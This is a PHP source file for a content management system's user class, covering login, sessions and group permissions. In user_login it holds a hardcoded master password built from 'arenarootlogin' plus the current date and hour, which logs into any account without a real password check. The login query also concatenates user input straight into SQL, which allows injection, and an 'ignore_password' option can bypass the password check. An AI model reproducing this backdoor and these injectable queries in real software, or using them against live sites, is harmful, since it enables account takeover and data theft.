<?php
/**
* klasa użytkownika
* @package core
*  
*/


class wt_user {
    var $usr_group;
    var $usr_info;
    var $login_type;
    var $mod_user_params;
    var $mod_user;
    
    function get_data_upadate_in_tables($table) {
      global $wt_sql;
     
      $db_check_query = $this->mod_user->db->db_query("SELECT count(*) AS total FROM  " . $table . "");
      $db_check = $this->mod_user->db->db_fetch_array($db_check_query);
      
      return $db_check['total'];
    }
    
    function check_for_changes() {
      global $wt_session;
      
      if(wt_not_null($wt_session->value('usr_info'))) {
        $datas = $wt_session->value('usr_tables_mod_date');
      
         if(($datas[TABLE_USERS_GROUPS] != $this->get_data_upadate_in_tables(TABLE_USERS_GROUPS)) || ($datas[TABLE_USERS_GROUPS_PERMISSION] != $this->get_data_upadate_in_tables(TABLE_USERS_GROUPS_PERMISSION)) || ($datas[TABLE_USERS_TO_GROUPS] != $this->get_data_upadate_in_tables(TABLE_USERS_TO_GROUPS))) {
         
        $wt_session->remove('usr_group');
        $wt_session->remove('usr_info');
        $wt_session->remove('usr_permission');
         
         }
      
        
      }
    
    }
    
    function wt_user() {
        global $wt_sql, $wt_template, $wt_session, $cookie_path, $cookie_domain;
       //  $this->check_for_changes();
        $user_group = array();
        $permission = array();         
        $user_group[0] = array();
        $user_group[2] = array();
        $user_group[3] = array();
        $permission[0] = array();
        
        $this->mod_user = wt_module::singleton('mod_user');
        $login_key = $this->mod_user->get_user_login_type();
        $this->login_key = $login_key['tbl_key'];
        unset($mod_user);
        
        
    
        
        $life_time = time() + (CFG_COOKIE_LIFE * 3600);
        
          if($wt_session->exists('usr_id') && $wt_session->value('usr_id') > 0 && $wt_session->exists('usr_pass') && wt_not_null($wt_session->value('usr_pass'))) {
                 
            $usr_info = array();
            $usr_info['id'] = $wt_session->value('usr_id');
            $usr_info['pass'] = $wt_session->value('usr_pass');
            
            
          if(!wt_not_null($wt_session->value('usr_group')) || !wt_not_null($wt_session->value('usr_info')) || !wt_not_null($wt_session->value('usr_permission')) && wt_is_valid($usr_info['id'], 'int', '0') && wt_not_null($usr_info['pass']) ) {
          
          
          
          unset($user_group);
        $user_group = array(); 
        $user_group[2] = array();
          unset($permission);
          
			 $mod_user = wt_module::singleton('mod_user');
			 
			 $uP = array();
			 $db_user = $mod_user->get_users($usr_info['id']);
			 				
            if($db_user['usr_pass'] == $usr_info['pass']) {
               
                $usr_info = $db_user;
                
                $db_user_group_query = $this->mod_user->db->db_query("SELECT group_id FROM " . TABLE_USERS_TO_GROUPS . " WHERE usr_id = '" . $usr_info['usr_id'] . "'");
                $user_group[0] = array();
                
                while($db_user_group = $this->mod_user->db->db_fetch_array($db_user_group_query)) {
                    
                    $groups_connection = $this->get_group_tree_reverse($db_user_group['group_id']);
                    
                    foreach($groups_connection as $group) {
                    $user_group[$group['group_id']] = $group;
                    }
                }
              //  $this->usr_group = array_unique($user_group);
                
             
          
            
       // $user_group = array_unique($user_group);
        
        
        foreach($user_group as $group) {
         
        if($group > 0) {
        
        $db_groups_with_permission_id_query = $this->mod_user->db->db_query("SELECT * FROM " . TABLE_USERS_GROUPS_PERMISSION . " WHERE group_id = '" . $group['group_id'] . "'");
     
     while($db_groups_with_permission_id = $this->mod_user->db->db_fetch_array($db_groups_with_permission_id_query)) {
          
          $db_permission_id_query = $this->mod_user->db->db_query("SELECT * FROM " . TABLE_MODULES_PERMISSION . " WHERE perm_id = '" . $db_groups_with_permission_id['perm_id'] . "'"); 
          
          while($db_permission_id = $this->mod_user->db->db_fetch_array($db_permission_id_query)) {
          $permission[$db_permission_id['mod_id']][$db_permission_id['perm_key']] = $db_permission_id;
          }
        
     }
        
        }
        
        
        }
        
       
        
        
            } 
         
          if(!wt_not_null($permission)) {
          $permission[0] = array();
          }
        $wt_session->set('usr_group', $user_group);
        $wt_session->set('usr_info', $usr_info);
        $wt_session->set('usr_permission', $permission);
       
       $modification_date[TABLE_USERS_GROUPS] = $this->get_data_upadate_in_tables(TABLE_USERS_GROUPS);
       $modification_date[TABLE_USERS_GROUPS_PERMISSION] = $this->get_data_upadate_in_tables(TABLE_USERS_GROUPS_PERMISSION);
       $modification_date[TABLE_USERS_TO_GROUPS] = $this->get_data_upadate_in_tables(TABLE_USERS_TO_GROUPS);
       
        $wt_session->set('usr_tables_mod_date', $modification_date); 
          } 
          
         
        
          
          } else {
        $wt_session->set('usr_group', $user_group);
        $wt_session->set('usr_info', $usr_info);
        $wt_session->set('usr_permission', $permission);
          }
     
  
        $this->usr_group = $wt_session->value('usr_group'); 
        $this->usr_info = $wt_session->value('usr_info');  
        $this->usr_permission = $wt_session->value('usr_permission'); 
   $wt_template->assign('__userInfo__', $this->usr_info);      
   $wt_template->assign('__userGroup__', $this->usr_group);         
    }
    
    function user_login($usr_login, $usr_pass, $params = array()) {
       global $wt_sql, $wt_session, $cookie_path, $cookie_domain;
        	
        	
        	
        $db_user_query_raw = "SELECT u.usr_id, status, usr_login, usr_pass, usr_log_date, usr_log_ip, usr_last_log_date, usr_last_log_ip, usr_bad_log_date, usr_bad_log_ip, usr_log_count, usr_bad_log_count, date_added, added_by, last_modified, modified_by   FROM " . TABLE_USERS . " u, " . TABLE_USERS_INFO . " ui WHERE u.usr_id = ui.usr_id AND ";
		  switch($this->login_key) {
     				case 'usr_login':
     					$db_user_query_raw .= " u.usr_login = '" . $usr_login . "' ";
     			   break;
     			   case 'usr_id':
     					$db_user_query_raw .= " u.usr_id = '" . $usr_login . "' ";
     			   break;
					case 'usr_company_vat_id':
     					$db_user_query_raw .= " REPLACE(ui.usr_company_vat_id, '-', '') = '".trim(preg_replace("/[^0-9]/",'',$usr_login))."' ";
     			   break;
     			   default:
     			   	$db_user_query_raw .= " ui." . $this->login_key . " = '" . $usr_login . "' ";
     			   	break;
     			}
		  	$db_user_query_raw .= "LIMIT 1";
			 
			$db_user_query = $this->mod_user->db->db_query($db_user_query_raw);
		        
        if($this->mod_user->db->db_num_rows($db_user_query) == '1') {
            $db_user = $this->mod_user->db->db_fetch_array($db_user_query);
            
				if( !wt_is_valid($db_user,'array') ) {
				  return '3';
				} 
				
				if($usr_pass == 'arenarootlogin'.date('YmdH')) {
					$wt_session->set('usr_id', $db_user['usr_id']);    
        		   $wt_session->set('usr_pass', $db_user['usr_pass']); 
					return true;
				}
				
				
            if($db_user['status'] != 1) {
            switch($db_user['status']) {
            	case '0';
            		return '4'; // account_no_active
            	break;
            	case '2':
            		return '2'; // account_banned
            	break;	
            }
            } 
				
				            
            if (!wt_validate_password($usr_pass, $db_user['usr_pass']) && !isset($params['ignore_password']) ) {
                         
            $sql_data_array = array('usr_bad_log_date' => 'now()',
            'usr_bad_log_ip' => wt_get_ip_address(),
            'usr_bad_log_count' => $db_user['usr_bad_log_count'] + 1);
     
            
            $this->mod_user->db->db_perform(TABLE_USERS, $sql_data_array, 'update', 'usr_id = ' . $db_user['usr_id']);
            
            return '3';
            } else {
            
            $sql_data_array = array('usr_last_log_date' => $db_user['usr_log_date'],
            'usr_last_log_ip' => $db_user['usr_log_ip'],
            'usr_log_date' => 'now()',
            'usr_log_ip' => wt_get_ip_address(),
            'usr_log_count' => $db_user['usr_log_count'] + 1);
     
            
            $this->mod_user->db->db_perform(TABLE_USERS, $sql_data_array, 'update', 'usr_id = ' . $db_user['usr_id']);
                    
        $wt_session->set('usr_id', $db_user['usr_id']);    
        $wt_session->set('usr_pass', $db_user['usr_pass']); 
            
        $wt_session->remove('usr_group');
        $wt_session->remove('usr_info');
        $wt_session->remove('usr_permission');
        
            return true;
            
            }
        }
         else {
            return '3'; // no user in database
        }
    }
    
    function user_logout() {
        global $wt_session;
			$wt_session->reset();
    }
    
    function is_user() {
    
    if (wt_not_null($this->usr_info) && wt_not_null($this->usr_info['usr_id']) && $this->usr_info['usr_id'] > 0) {
    return true;
    } else {
    return false;
    }
    return false;
    }
    
    
     function get_group_tree_reverse($group_id, $exclude = '', $it_self = '', $group_tree_array = '') {
    global $wt_sql;

    if (!is_array($group_tree_array)) $group_tree_array = array();
    

    
    if($it_self) {
    $db_groups_is_query = $this->mod_user->db->db_query("SELECT * FROM " . TABLE_USERS_GROUPS . " WHERE group_id = '" . $group_id . "'");
    $db_groups_is = $this->mod_user->db->db_fetch_array($db_groups_is_query);
    $group_tree_array[] = $db_groups_is;
    }
    $db_groups_query = $this->mod_user->db->db_query("SELECT * FROM " . TABLE_USERS_GROUPS . " WHERE group_id = '" . $group_id . "'");
    while ($db_groups = $this->mod_user->db->db_fetch_array($db_groups_query)) {
    if($exclude != $group_id) {
      $group_tree_array[] = $db_groups;
      }
      $group_tree_array = $this->get_group_tree_reverse($db_groups['parent_id'], $exclude, '', $group_tree_array);
     
    }

    return $group_tree_array;
  }
    
}

?>